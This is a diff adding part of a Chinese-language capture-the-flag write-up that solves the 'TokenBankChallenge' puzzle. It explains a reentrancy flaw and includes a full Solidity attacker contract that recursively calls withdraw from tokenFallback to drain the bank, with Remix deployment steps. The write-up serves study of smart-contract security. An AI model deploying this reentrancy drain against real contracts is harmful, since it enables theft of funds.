@@ -223,11 +223,100 @@ contract TokenBankChallenge {
 因为在withdraw内，在require中去执行transfer并且是先transfer再执行减少操作，所以这里如果**to**是一个恶意的合约，在**to**这个地址上的**tokenFallback**中再去调用withdraw，那么就变成了无限循环的重入攻击了
 
 ```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISimpleERC223Token {
+    function balanceOf(address from) external returns (uint256);
+    function totalSupply() external returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool success);
+    function transfer(address to, uint256 value, bytes memory data) external returns (bool success);
+    function approve(address spender, uint256 value) external returns (bool success);
+    function transferFrom(address from, address to, uint256 value) external returns (bool success);
+}
+
+interface ITokenBankChallenge {
+    function token() external returns (address);
+    function balanceOf(address from) external returns (uint256);
+    function isComplete() external view returns (bool);
+    function withdraw(uint256 amount) external;
+    function tokenFallback(address from, uint256 value, bytes memory bts) external;
+}
+
+contract TokenBankChallengeAttacker {
+    ITokenBankChallenge public bank;
+    ISimpleERC223Token public token;
+
+    constructor(address bankAddr) {
+        bank  = ITokenBankChallenge(bankAddr);
+        token = ISimpleERC223Token(bank.token());
+    }
+
+    function attack() public {
+        
+        token.transfer(address(bank), 500000 * 10**18);
+
+        bank.withdraw(500000 * 10**18);
+        require(bank.isComplete() == true);
+    }
+
+    function tokenFallback(address from, uint256 values, bytes memory bts) public {
+        
+        require(msg.sender == address(token));
+
+        if (from == address(bank)) {
+            if (token.balanceOf(address(bank)) > 0) {
+                uint256 balance = bank.balanceOf(address(this));
+                bank.withdraw(balance);
+            }
+        }
+    }
+}
 ```
 
+恶意的攻击合约代码如上，以第一个地址：0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 为msg.sender，即bank合约的owner，的身份，传入第二个地址：0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2，部署bank合约
 
+![](bankdeploy.png)
 
+拿到bank合约的地址，传入到Attacker的构造函数中并部署
 
+![](attackerdeploy.png)
 
+bank合约在创建的时候就是owner拥有一半货币，player拥有一半货币，只要owner不把他的那一半转过来，bank所持有的余额就不可能为0
 
+![](playerwithdraw.png)
+
+切回player的身份调用bank合约的withdraw方法将bank中的货币取出来
+
+![](getbankandtoken.png)
+
+在bank合约中获取token地址
+
+![](tokenataddress.png)
+
+打开有SimpleERC223Token合约的solidity文件，在At Address中传入上边获取的token的地址，最后点击At Address获得token合约
+
+![](tokenbalanceof.png)
+
+在balanceOf中传入player的地址，发现此时余额已经变为 5 * 10^23 了，说明货币已经从bank中提取了出来
+
+![](playertransfer.png)
+
+还是以player身份，传入Attacker合约地址和 5 * 10^23 然后调用transfer，把player的余额都转让给Attacker合约
+
+![](playerbalance.png)
+
+![](attackerbalance.png)
+
+可以看到player余额变为0，Attacker合约余额变为 5 * 10^23 
+
+![](attack2.png)
+
+调用逻辑：bank.withdraw() => token.transfer => msg.sender.tokenFallback()
+
+现在准备工作已经完成，可以调用Attacker合约中的attack方法了，此时调用attack，先将Attacker合约的余额存入bank，然后再执行withdraw，根据调用逻辑，最终token合约的transfer会回调我们Attacker合约的tokenFallback方法，在这个方法中我们再次withdraw就可以使bank的余额清0了
+
+![](bankbalance.png)
+
+调用完attack之后，再查看一下bank的余额已经变为0了，puzzle完成
 
